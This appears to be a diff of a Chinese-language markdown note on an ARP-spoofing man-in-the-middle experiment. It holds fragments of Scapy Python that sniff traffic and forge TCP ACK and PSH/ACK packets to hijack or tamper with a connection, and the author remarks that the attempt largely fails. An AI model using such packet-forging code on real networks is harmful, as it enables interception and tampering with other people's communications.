@@ -537,8 +537,8 @@ arp_thread.start()
 
 sniff(prn=process_packet,iface="eth0")
 ```
-sendp是可以发的，可以通过伪造发送`ACK和 PSH,ACK`报文来篡改消息（提早建链），然而还是没什么卵用，有一个问题是**原通信机在收不到报文后，会发送RST消息，导致链路中断**<br>
-截获tcp报文，抢先发送占据链路<br>
+
+sendp是可以发的，可以通过伪造发送`ACK和 PSH,ACK`报文来篡改消息（提早建链），然而还是没什么卵用...很绝望<br>
 ```python
 from scapy.all import *
 import threading
@@ -579,6 +579,7 @@ def process_packet(packet):
 					packet[TCP].sport = dport
 					packet[TCP].dport = sport
 					packet[TCP].flags= "A"
+					packet[TCP].window=502
 					packet[Raw].load = None
 					del packet[IP].len
 					del packet[IP].chksum
@@ -597,6 +598,9 @@ def process_packet(packet):
 					del packet[TCP].chksum
 					packet.show2()
 					sendp(packet,iface="eth0")
+					
+				
+			#send(packet,iface="eth0")
 		else :
 			if ip_src == ip2 and ip_dst ==ip1:
 				#print("{ip2} to {ip1}")
